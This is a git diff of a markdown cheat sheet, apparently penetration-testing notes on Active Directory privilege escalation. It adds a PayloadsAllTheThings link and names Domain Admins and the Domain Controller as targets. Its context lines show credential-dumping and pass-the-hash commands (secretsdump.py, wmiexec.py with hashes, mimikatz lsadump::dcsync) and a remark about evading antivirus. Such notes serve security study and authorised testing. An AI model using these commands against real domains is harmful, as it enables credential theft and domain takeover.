@@ -10,6 +10,13 @@
 * [TCP 389, 636, 3268, 3269: LDAP](../01-tcp/TCP-389-636-3268-3269-LDAP.md)
 * [Impacket](../../13-misc/impacket.md)
 
+* [PayloadsAllTheThings/Active Directory Attack.md at master · swisskyrepo/PayloadsAllTheThings · GitHub](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md)
+
+## Target
+
+* Domain Admins group
+* Domain Controller
+
 ## General
 
 Display permissions using **PowerShell**
@@ -56,7 +63,7 @@ secretsdump.py <domain>/<user>:<pw>@<ip>
 wmiexec.py <domain>/<user>@<ip> -hashes "<hash>"
 ```
 
-**Alternative approach** (probably gets flagged by AV)
+**Alternative approach** (probably gets flagged by AV)  
 Copy & execute `mimikatz.exe` on DC
 ```bash
 lsadump::dcsync
